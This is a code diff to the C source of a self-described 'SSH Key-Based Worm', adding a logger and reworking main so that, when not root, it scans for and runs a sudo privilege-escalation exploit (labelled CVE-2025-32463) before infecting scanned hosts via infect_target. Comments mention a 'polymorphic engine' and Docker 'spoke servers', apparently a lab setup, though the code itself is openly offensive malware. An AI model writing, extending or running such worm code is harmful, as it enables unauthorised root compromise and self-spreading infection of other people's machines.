@@ -540,45 +540,75 @@ void get_net_24(const char *ip, char *out) {
     }
 }
 
-int main(int argc, char* argv[]) {
-    (void)argc;  // Suppress unused parameter warning
+/*
+ * Function for LOGGER purposes. One log for normal users and another one for root
+ */
+int setup_logger() {
 
-    // LOGGER: For debbuging, testing and For logs on each machine
+    char log_file[100] = "worm.log";
+
+    // Another filename as root for not overwritting
+    if (!getuid()) {
+        strcpy(log_file, "worm_root.log");
+    }
+
     char log_path[512];
-    snprintf(log_path, sizeof(log_path), "%s/worm.log", getenv("HOME"));
+    snprintf(log_path, sizeof(log_path), "%s/%s", getenv("HOME"), log_file);
 
     int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
     if (fd < 0) {
         perror("open");
+        return -1; // error
+    }
+
+    // Redirects stdout
+    if (dup2(fd, STDOUT_FILENO) < 0) {
+        perror("dup2");
+        close(fd);
+        return -1;
+    }
+
+    close(fd);
+
+    return 0;
+}
+
+int main(int argc, char* argv[]) {
+    (void)argc;  // Suppress unused parameter warning
+
+    // Logger set up
+    if (setup_logger() != 0) {
+        fprintf(stderr, "Error al configurar el logger\n");
         return 1;
     }
 
-    dup2(fd, STDOUT_FILENO);
-    close(fd);
-
     // Start
     printf("\n=== C SSH Key-Based Worm ===\n\n");
-    
+
+
     // Initialize random seed for polymorphic engine
     srand(time(NULL));
     
     // Delay to allow system to settle if just started
     sleep(2);
-    
+
     // Attempt privilege escalation on spoke servers (before SSH key check)
     // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
     // This works better than hostname checking since Docker containers have random hostnames
+    if (getuid() != 0) {
+        printf("[*] Checking for CVE-2025-32463\n");
 
-    printf("[*] Checking for CVE-2025-32463...\n");
-    if (cve_2025_32463_scan()) {
-        printf("[+] CVE-2025-32463 vulnerability detected. Attempting privilege escalation...\n");
-        if (cve_2025_32463_execute()) {
-            printf("[+] Privilege escalation successful! Continuing as root...\n");
+        // Check if the vulnn can be applied
+        if (cve_2025_32463_scan()) {
+            printf("[+] CVE-2025-32463 vulnerability detected\n");
+            cve_2025_32463_execute(); 
+            printf("[+] CVE-2025-32463 applied. Continuing as root in another thread\n");
         } else {
-            printf("[-] Privilege escalation failed, continuing as unprivileged user\n");
+        printf("[-] CVE-2025-32463 not applicable. Continuing as normal user\n");
         }
+
     } else {
-        printf("[-] CVE-2025-32463 not applicable (sudo version not vulnerable or not installed)\n");
+        printf("[+] CVE-2025-32463 applied. You are root!\n");
     }
 
     // Check if SSH keys exist
@@ -645,5 +675,6 @@ int main(int argc, char* argv[]) {
             infect_target(ip, argv[0]);
         }
     }
+
     return 0;
 }
